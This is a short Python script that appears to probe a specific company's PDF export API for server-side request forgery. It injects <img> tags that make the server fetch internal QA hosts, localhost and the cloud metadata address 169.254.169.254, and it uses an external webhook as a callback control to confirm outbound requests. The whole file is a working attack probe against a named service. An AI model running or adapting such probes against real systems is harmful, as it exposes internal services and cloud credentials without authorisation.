import json,subprocess,os,uuid
H=os.environ['H']; T=os.environ['T']; BB=os.environ['BB']; WH=os.environ['WH']
def gen(html,name):
    cmd=['curl','-s','-m','120','-o','/tmp/b','-w','%{http_code}','-X','POST',
         H+'/api/v1/document_intelligence/export/pdf',
         '-H','token: '+T,'-H',BB,'-H','Content-Type: application/json',
         '-d',json.dumps({"htmlContent":html,"fileName":name})]
    c=subprocess.run(cmd,capture_output=True,text=True).stdout.strip()
    try: return c,json.loads(open('/tmp/b',encoding='utf-8',errors='replace').read()).get('url')
    except: return c,None
tag='zx'+uuid.uuid4().hex[:8]
targets=[
 ('integrations-version','http://integrations.qa.soxhubapp.com/version'),
 ('integrations-health','http://integrations.qa.soxhubapp.com/api/v1/health'),
 ('localhost-3000','http://localhost:3000/version'),
 ('imds','http://169.254.169.254/latest/meta-data/'),
]
for label,u in targets:
    c,url=gen(f'<img src="{u}">',f"zx-{tag}-{label}")
    print(f"  {label:22} gen={c} url={'yes' if url else 'no'}")
print()
c,url=gen(f'<img src="{WH}/{tag}-ctrl.png">',f"zx-{tag}-ctrl")
print(f"  control(external)      gen={c} url={'yes' if url else 'no'}")
